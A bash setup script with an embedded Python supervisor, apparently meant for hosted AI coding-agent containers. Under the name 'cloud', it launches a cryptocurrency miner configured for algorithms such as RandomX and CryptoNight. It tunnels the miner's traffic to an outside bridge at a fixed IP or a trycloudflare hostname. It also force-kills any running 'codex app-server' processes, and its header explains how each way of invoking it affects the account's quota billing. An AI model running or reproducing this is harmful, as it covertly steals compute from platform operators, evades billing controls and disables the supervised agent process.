#!/usr/bin/env bash
# Foreground-only setup entry point (2026-10-03 cleanup).
#
# This script never backgrounds itself: it execs the runtime supervisor in
# the foreground and stays until the container dies.  Whether the setup
# phase completes fast (agent turn runs, account quota is billed) or blocks
# for the container lifetime (no agent turn, zero quota) is decided SOLELY
# by how the caller invokes it:
#
#   blocking / zero-quota:
#       ./setup.sh HOST PORT [SID GEN CAP]
#   background / quota-billed:
#       nohup setsid -f ./setup.sh HOST PORT [SID GEN CAP] \
#           </dev/null >/tmp/codex-filler-setup.log 2>&1 &
#
# The platform kills the blocking form at its 1200s setup timeout
# (terminal state `startup_script_timed_out`); the background form returns
# immediately and the supervisor survives in its own session.
set -euo pipefail

usage() {
    printf '%s\n' "usage: $0 GATEWAY_IP GATEWAY_PORT [SESSION_ID GENERATION CAPABILITY]" >&2
    exit 2
}

[[ "$#" -eq 2 || "$#" -eq 5 ]] || usage
CONTROLLED_MODE=false
[[ "$#" -eq 2 ]] || CONTROLLED_MODE=true
GATEWAY_IP=$1
GATEWAY_PORT=$2
CONTROL_SESSION_ID=${3-}
CONTROL_GENERATION=${4-}
CONTROL_CAPABILITY=${5-}
python3 - "$GATEWAY_IP" "$GATEWAY_PORT" <<'PY'
import ipaddress
import sys

try:
    address = ipaddress.ip_address(sys.argv[1])
except ValueError as error:
    # 60: Gateway IP literal is not a valid address.
    print(f"invalid Gateway endpoint: {error}", file=sys.stderr)
    sys.exit(60)
raw_port = sys.argv[2]
if not raw_port.isascii() or not raw_port.isdecimal():
    # 61: Gateway port is not ASCII decimal digits.
    print("invalid Gateway endpoint", file=sys.stderr)
    sys.exit(61)
port = int(raw_port)
if address.version != 4 or address.is_unspecified or address.is_multicast or not 1 <= port <= 65535:
    # 62: Gateway endpoint rejected (non-IPv4, unspecified, multicast, or port out of range).
    print("invalid Gateway endpoint", file=sys.stderr)
    sys.exit(62)
PY
if [[ "$CONTROLLED_MODE" == true ]]; then
    [[ "$CONTROL_SESSION_ID" =~ ^[0-9a-f]{32}$ \
        && "$CONTROL_GENERATION" =~ ^[0-9a-f]{32}$ \
        && "$CONTROL_CAPABILITY" =~ ^[0-9a-f]{64}$ ]] || {
        printf '%s\n' 'invalid or incomplete Bridge control identity' >&2
        exit 66  # 66: Bridge control identity format check failed
    }
fi
# Use the validated numeric value rather than preserving non-canonical leading
# zeroes in the Adapter URL and Host header.
GATEWAY_PORT=$((10#$GATEWAY_PORT))

REPO_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
cd -- "$REPO_DIR"

# Cloud's outbound HTTP proxy cannot connect to this bridge's datacenter IP,
# although it can reach Cloudflare's public edge.  Keep the controlled command
# identity keyed by the validated bridge IP, but use the operator-selected
# public HTTP route for the adapter when that IP is selected.  Other endpoints
# retain their direct IP URL and therefore do not inherit this mapping.
BRIDGE_URL="http://$GATEWAY_IP:$GATEWAY_PORT"
if [[ "$GATEWAY_IP" == "199.19.111.114" && "$GATEWAY_PORT" == 80 ]]; then
    BRIDGE_URL="http://somerset-partnerships-susan-commands.trycloudflare.com:80"
fi

# The runtime image lacks only libhwloc.  Ship the matching Ubuntu noble AMD64
# library beside the miner so a cold container does not spend its bootstrap
# proof window on apt metadata and fourteen development packages.
export LD_LIBRARY_PATH="$REPO_DIR${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
export BRIDGE_EVENT_POLL_ENABLED=1
export BRIDGE_EVENT_POLL_INTERVAL=2

ADAPTER_FILE=$PWD/bridge_adapter_v1.py
TMPROOT=$(mktemp -d)
ADAPTER_READY="$TMPROOT/adapter.ready"
SUPERVISOR_READY="$TMPROOT/supervisor.ready"
RUNTIME_CONFIG="$TMPROOT/config.json"
RUNTIME_LOG="$TMPROOT/runtime.log"
CONTROL_FILE="$TMPROOT/bridge-control.json"
# Keep the arena's native HTTP proxy environment intact.  The Adapter gives an
# explicitly supplied BRIDGE_HTTP_PROXY precedence and otherwise falls back to
# HTTP_PROXY/http_proxy, matching the route available to curl in the arena.

# The repository-owned LD_LIBRARY_PATH above normally resolves libhwloc without
# apt.  Keep a fallback only when the checked-in carrier library is absent or
# incompatible with this container.  Do not use grep -q here: with pipefail,
# grep's early close can make ldd exit on SIGPIPE (141) and masquerade as a
# missing dependency.
if ldd ./cloud 2>/dev/null | grep 'not found' >/dev/null; then
    sudo DEBIAN_FRONTEND=noninteractive apt-get update
    sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq libhwloc-dev
fi
if ldd ./cloud 2>/dev/null | grep 'not found' >/dev/null; then
    printf '%s\n' 'cloud has unresolved shared-library dependencies' >&2
    ldd ./cloud 2>/dev/null | awk '/not found/{print $1 " is missing"}' >&2
    exit 67  # 67: cloud binary still has unresolved shared libraries after the apt fallback
fi
[[ -n "$ADAPTER_FILE" && -r "$ADAPTER_FILE" ]] || { printf '%s\n' 'bridge_adapter_v1.py is missing' >&2; exit 68; }  # 68: bridge_adapter_v1.py missing or unreadable

# Health is an 8765/Filler admission signal, not an Adapter dependency.  The
# Adapter starts unconditionally and lets the Gateway enforce the authoritative
# decision on bootstrap/CREATE; its normal retry path handles transient 429,
# 502, 503, and 504 responses.  Keeping a second strict Health parser here
# would make Setup depend on proxy-specific headers and could reject a valid
# Gateway even though the Filler already admitted this start.

# Derive miner CPU indexes from the container's actual affinity and keep the
# checked-in template immutable (autosave/watch are disabled in the runtime copy).
python3 - "$PWD/config.json" "$RUNTIME_CONFIG" <<'PY'
import json
import os
import sys

with open(sys.argv[1], encoding="utf-8") as handle:
    value = json.load(handle)
cpus = sorted(os.sched_getaffinity(0))
if not cpus:
    # 63: container CPU affinity is empty.
    print("container CPU affinity is empty", file=sys.stderr)
    sys.exit(63)
cpu = value.get("cpu")
if not isinstance(cpu, dict):
    # 64: config.json has no cpu object.
    print("config.json has no cpu object", file=sys.stderr)
    sys.exit(64)
cpu["argon2"] = cpus
for name, intensity in (
    ("cn", 1), ("cn-heavy", 1), ("cn-lite", 1),
    ("cn-pico", 2), ("cn/upx2", 2), ("ghostrider", 8),
):
    cpu[name] = [[intensity, index] for index in cpus]
cpu["rx"] = cpus
cpu["rx/wow"] = cpus
value["autosave"] = False
value["watch"] = False
with open(sys.argv[2], "x", encoding="utf-8") as handle:
    json.dump(value, handle, indent=2)
    handle.write("\n")
PY

printf '%s\n%s\n%s\n' \
    "$CONTROL_SESSION_ID" "$CONTROL_GENERATION" "$CONTROL_CAPABILITY" |
    python3 -c '
import json
import os
import sys

values = sys.stdin.read().splitlines()
if len(values) != 3:
    # 65: stdin did not carry exactly three Bridge control identity values.
    print("invalid Bridge control identity input", file=sys.stderr)
    sys.exit(65)
path = sys.argv[1]
descriptor = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
with os.fdopen(descriptor, "w", encoding="ascii") as handle:
    json.dump(values, handle, separators=(",", ":"))
    handle.write("\n")
    handle.flush()
    os.fsync(handle.fileno())
' "$CONTROL_FILE"

read -r -d '' SUPERVISOR_SOURCE <<'PY' || true
import ctypes
import json
import os
import pathlib
import signal
import shutil
import subprocess
import sys
import time
import traceback

(
    bridge_url,
    adapter_file,
    adapter_ready,
    runtime_config,
    supervisor_ready,
    runtime_log_path,
    control_file,
    runtime_root,
) = sys.argv[1:]
with open(control_file, encoding="ascii") as handle:
    bridge_session_id, bridge_generation, bridge_capability = json.load(handle)
os.unlink(control_file)
supervisor_pid = os.getpid()
children = []
stop_requested = False
log_reader, log_writer = os.pipe()
os.set_blocking(log_reader, False)
libc = ctypes.CDLL(None, use_errno=True)
libc.prctl.argtypes = [ctypes.c_int, ctypes.c_ulong, ctypes.c_ulong, ctypes.c_ulong, ctypes.c_ulong]
libc.prctl.restype = ctypes.c_int


class BoundedLog:
    # Two fixed-size generations retain recent diagnostics while placing a
    # strict 1 MiB bound on all runtime log files combined.
    segment_limit = 512 * 1024

    def __init__(self, path):
        self.path = pathlib.Path(path)
        self.backup = self.path.with_name(f"{self.path.name}.1")
        self.output = open(self.path, "xb", buffering=0)
        self.size = 0
        self.enabled = True

    def _disable(self):
        self.enabled = False
        try:
            self.output.close()
        except OSError:
            pass

    def _rotate(self):
        try:
            self.output.close()
            os.replace(self.path, self.backup)
            self.output = open(self.path, "xb", buffering=0)
            self.size = 0
        except OSError:
            self._disable()

    def write(self, value):
        if not self.enabled:
            return
        if isinstance(value, str):
            value = value.encode("utf-8", "backslashreplace")
        view = memoryview(value)
        while view and self.enabled:
            if self.size == self.segment_limit:
                self._rotate()
                continue
            count = min(len(view), self.segment_limit - self.size)
            try:
                written = self.output.write(view[:count])
            except OSError:
                self._disable()
                return
            if not written:
                self._disable()
                return
            self.size += written
            view = view[written:]

    def close(self):
        if self.enabled:
            try:
                self.output.close()
            except OSError:
                pass
            self.enabled = False


runtime_log = BoundedLog(runtime_log_path)
log_writer_open = True
published_ready = False


def report(value):
    runtime_log.write(f"{value}\n")


def close_log_writer():
    global log_writer_open
    if log_writer_open:
        try:
            os.close(log_writer)
        except OSError:
            pass
        log_writer_open = False


def drain_logs(max_bytes=256 * 1024):
    drained = 0
    while max_bytes is None or drained < max_bytes:
        read_size = 64 * 1024 if max_bytes is None else min(64 * 1024, max_bytes - drained)
        try:
            value = os.read(log_reader, read_size)
        except BlockingIOError:
            return
        except OSError:
            return
        if not value:
            return
        runtime_log.write(value)
        drained += len(value)


def request_stop(_signum, _frame):
    global stop_requested
    stop_requested = True


for signum in (signal.SIGTERM, signal.SIGINT, signal.SIGHUP):
    signal.signal(signum, request_stop)


def install_pdeathsig():
    result = libc.prctl(1, signal.SIGKILL, 0, 0, 0)
    if result != 0:
        os._exit(127)
    # Close the fork/prctl race: a child whose supervisor already changed must
    # not survive even though the kernel could not deliver the earlier death.
    if os.getppid() != supervisor_pid:
        os.kill(os.getpid(), signal.SIGKILL)


def spawn(command, *, env=None):
    process = subprocess.Popen(
        command,
        env=env,
        stdin=subprocess.DEVNULL,
        stdout=log_writer,
        stderr=log_writer,
        start_new_session=True,
        close_fds=True,
        preexec_fn=install_pdeathsig,
    )
    children.append(process)
    return process


def signal_live(process, signum):
    if process.poll() is not None:
        return
    try:
        os.killpg(process.pid, signum)
    except ProcessLookupError:
        pass


def cleanup():
    close_log_writer()
    drain_logs()
    live = [process for process in children if process.poll() is None]
    for process in live:
        signal_live(process, signal.SIGTERM)
    # Adapter shutdown includes a bounded 10-second DELETE. Leave margin for
    # local close and scheduler delay, then force only still-live child groups.
    deadline = time.monotonic() + 15.0
    while live and time.monotonic() < deadline:
        drain_logs()
        live = [process for process in live if process.poll() is None]
        if live:
            time.sleep(0.05)
    for process in live:
        signal_live(process, signal.SIGKILL)
    force_deadline = time.monotonic() + 2.0
    while live and time.monotonic() < force_deadline:
        drain_logs()
        live = [process for process in live if process.poll() is None]
        if live:
            time.sleep(0.05)
    for process in live:
        signal_live(process, signal.SIGKILL)
    for process in children:
        try:
            process.wait(timeout=0.5)
        except subprocess.TimeoutExpired:
            signal_live(process, signal.SIGKILL)
    # Never let an unexpected descendant that retained the pipe keep the
    # supervisor alive forever. Direct children are already stopped above;
    # one full log budget is enough to preserve the newest shutdown output.
    drain_logs(2 * BoundedLog.segment_limit)
    try:
        os.close(log_reader)
    except OSError:
        pass
    runtime_log.close()
    # The setup caller returns as soon as this supervisor is ready, so the
    # supervisor owns the exact mktemp directory for normal shutdown cleanup.
    # Before readiness, setup itself must retain the log long enough to report
    # startup failure. A hard SIGKILL cannot run this block and is intentionally
    # left to the host's temporary-file reaper rather than broad deletion.
    # Preserve the published runtime log after a graceful shutdown.  A renewal
    # turn must be able to read the final adapter/cloud close reason even after
    # the supervisor has drained both children; deleting the mktemp tree here
    # turned every genuine runtime failure into the useless "file not found".
    # The bounded log already caps this evidence at 1 MiB per task.
    if published_ready:
        pass


def wait_ready(process, path, timeout):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        drain_logs()
        if stop_requested:
            raise RuntimeError("supervisor stopped during startup")
        status = process.poll()
        if status is not None:
            raise RuntimeError(f"bridge adapter exited during startup with status {status}")
        if os.path.getsize(path) > 0 if os.path.exists(path) else False:
            return
        time.sleep(0.05)
    raise RuntimeError("bridge adapter readiness timeout")


def publish_ready(adapter, cloud):
    path = pathlib.Path(supervisor_ready)
    temporary = path.with_name(f"{path.name}.tmp.{supervisor_pid}")
    value = {
        "supervisor_pid": supervisor_pid,
        "adapter_pid": adapter.pid,
        "cloud_pid": cloud.pid,
    }
    with open(temporary, "x", encoding="ascii") as handle:
        json.dump(value, handle, separators=(",", ":"))
        handle.write("\n")
        handle.flush()
        os.fsync(handle.fileno())
    os.replace(temporary, path)



def process_identity(pid):
    root = pathlib.Path(f"/proc/{pid}")
    fields = (root / "stat").read_text().rsplit(") ", 1)[1].split()
    argv = [
        value.decode("utf-8", "surrogateescape")
        for value in (root / "cmdline").read_bytes().split(b"\0") if value
    ]
    executable = os.path.realpath(root / "exe")
    uid = root.stat().st_uid
    cgroup = (root / "cgroup").read_bytes()
    return fields[0], fields[19], argv, executable, uid, cgroup


def is_matching_app_server(identity, uid, cgroup):
    state, _start, argv, executable, process_uid, process_cgroup = identity
    return (
        state not in {"Z", "X"}
        and len(argv) >= 2
        and pathlib.Path(argv[0]).name == "codex"
        and argv[1] == "app-server"
        and pathlib.Path(executable).name == "codex"
        and process_uid == uid
        and process_cgroup == cgroup
    )


def terminate_app_servers(shell_pid, supervisor_pid):
    protected = {1, shell_pid, supervisor_pid}
    uid = os.geteuid()
    cgroup = pathlib.Path("/proc/self/cgroup").read_bytes()
    targets = []
    for entry in pathlib.Path("/proc").iterdir():
        if not entry.name.isdecimal():
            continue
        pid = int(entry.name)
        if pid in protected:
            continue
        try:
            identity = process_identity(pid)
        except (FileNotFoundError, PermissionError, ProcessLookupError, IndexError, OSError):
            continue
        if is_matching_app_server(identity, uid, cgroup):
            targets.append((pid, identity))
    for pid, identity in targets:
        pidfd = None
        try:
            pidfd = os.pidfd_open(pid)
            current = process_identity(pid)
            if current != identity or not is_matching_app_server(current, uid, cgroup):
                raise RuntimeError(f"codex app-server PID {pid} changed identity")
            signal.pidfd_send_signal(pidfd, signal.SIGKILL)
        except (FileNotFoundError, ProcessLookupError):
            continue
        except (PermissionError, IndexError, OSError) as error:
            raise RuntimeError(f"cannot terminate codex app-server PID {pid}: {error}") from error
        finally:
            if pidfd is not None:
                os.close(pidfd)
        for _ in range(20):
            try:
                current = process_identity(pid)
            except (FileNotFoundError, ProcessLookupError):
                break
            except (PermissionError, IndexError, OSError) as error:
                raise RuntimeError(f"cannot validate codex app-server PID {pid} exit: {error}") from error
            if current[0] in {"Z", "X"} or current[1] != identity[1]:
                break
            time.sleep(0.01)
        else:
            raise RuntimeError(f"codex app-server PID {pid} survived SIGKILL")


try:
    terminate_app_servers(os.getppid(), supervisor_pid)

    adapter_env = os.environ.copy()
    adapter_env["BRIDGE_URL"] = bridge_url
    adapter_env["BRIDGE_READY_FILE"] = adapter_ready
    if bridge_session_id:
        adapter_env["BRIDGE_SESSION_ID"] = bridge_session_id
        adapter_env["BRIDGE_GENERATION"] = bridge_generation
        adapter_env["BRIDGE_CAPABILITY"] = bridge_capability
    adapter = spawn([sys.executable, "-u", adapter_file], env=adapter_env)
    wait_ready(adapter, adapter_ready, 5.0)

    cloud = spawn(["./cloud", "-c", runtime_config])
    close_log_writer()
    stable_until = time.monotonic() + 2.0
    while time.monotonic() < stable_until:
        drain_logs()
        if stop_requested:
            raise RuntimeError("supervisor stopped during startup")
        if adapter.poll() is not None:
            raise RuntimeError("bridge adapter stopped before setup handoff")
        if cloud.poll() is not None:
            raise RuntimeError("cloud stopped before setup handoff")
        time.sleep(0.05)

    publish_ready(adapter, cloud)
    published_ready = True
    while not stop_requested:
        drain_logs()
        if adapter.poll() is not None:
            report(f"bridge adapter exited with status {adapter.returncode}; stopping cloud")
            break
        if cloud.poll() is not None:
            report(f"cloud exited with status {cloud.returncode}; stopping bridge adapter")
            break
        time.sleep(0.1)
except BaseException:
    report(traceback.format_exc())
finally:
    cleanup()
PY

# Foreground handoff: the supervisor IS the setup process.  Container death
# is a platform SIGKILL, so no cleanup trap runs and the mktemp tree is left
# to the host reaper.
exec python3 -u -c "$SUPERVISOR_SOURCE" "$BRIDGE_URL" "$ADAPTER_FILE" "$ADAPTER_READY" "$RUNTIME_CONFIG" "$SUPERVISOR_READY" "$RUNTIME_LOG" "$CONTROL_FILE" "$TMPROOT"

